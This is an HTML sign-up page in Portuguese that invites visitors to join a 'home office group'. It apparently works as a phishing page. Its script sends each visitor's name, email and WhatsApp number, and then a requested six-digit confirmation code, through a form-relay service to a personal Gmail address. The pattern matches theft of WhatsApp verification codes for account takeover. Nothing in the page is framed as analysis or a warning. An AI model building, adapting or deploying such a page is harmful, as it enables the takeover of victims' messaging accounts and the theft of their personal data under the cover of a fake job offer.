<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Cadastro Home Office</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f0f0f0;
      padding: 20px;
    }
    .box {
      background: #fff;
      padding: 25px;
      max-width: 400px;
      margin: 40px auto;
      border-radius: 12px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
    }
    input, button {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      font-size: 16px;
      border-radius: 8px;
      border: 1px solid #ccc;
    }
    button {
      background: #007bff;
      color: #fff;
      border: none;
      cursor: pointer;
    }
    button:hover {
      background: #0056b3;
    }
  </style>
</head>
<body>

  <!-- Etapa 1 -->
  <div class="box" id="etapa1">
    <h2>Participe do grupo de Home Office</h2>
    <form id="formEtapa1">
      <input type="text" name="nome" placeholder="Seu nome" required>
      <input type="email" name="email" placeholder="Seu e-mail" required>
      <input type="text" name="whatsapp" placeholder="Número do WhatsApp" required>
      <button type="submit">Avançar</button>
    </form>
  </div>

  <!-- Etapa 2 -->
  <div class="box" id="etapa2" style="display:none">
    <h2>Confirme sua participação</h2>
    <form id="formEtapa2">
      <input type="text" name="codigo" placeholder="Digite o código de 6 dígitos" maxlength="6" required>
      <button type="submit">Finalizar</button>
    </form>
  </div>

  <!-- Mensagem final -->
  <div class="box" id="final" style="display:none">
    <h2>Obrigado!</h2>
    <p>Você concluiu o cadastro.</p>
  </div>

  <script>
    const etapa1 = document.getElementById("etapa1");
    const etapa2 = document.getElementById("etapa2");
    const final = document.getElementById("final");

    // Envio da etapa 1
    document.getElementById("formEtapa1").addEventListener("submit", function(e) {
      e.preventDefault();
      fetch("https://formsubmit.co/natanaelverissimo34@gmail.com", {
        method: "POST",
        body: new FormData(this),
        headers: { 'Accept': 'application/json' }
      }).then(() => {
        etapa1.style.display = "none";
        etapa2.style.display = "block";
      });
    });

    // Envio da etapa 2
    document.getElementById("formEtapa2").addEventListener("submit", function(e) {
      e.preventDefault();
      fetch("https://formsubmit.co/natanaelverissimo34@gmail.com", {
        method: "POST",
        body: new FormData(this),
        headers: { 'Accept': 'application/json' }
      }).then(() => {
        etapa2.style.display = "none";
        final.style.display = "block";
      });
    });
  </script>

</body>
</html>
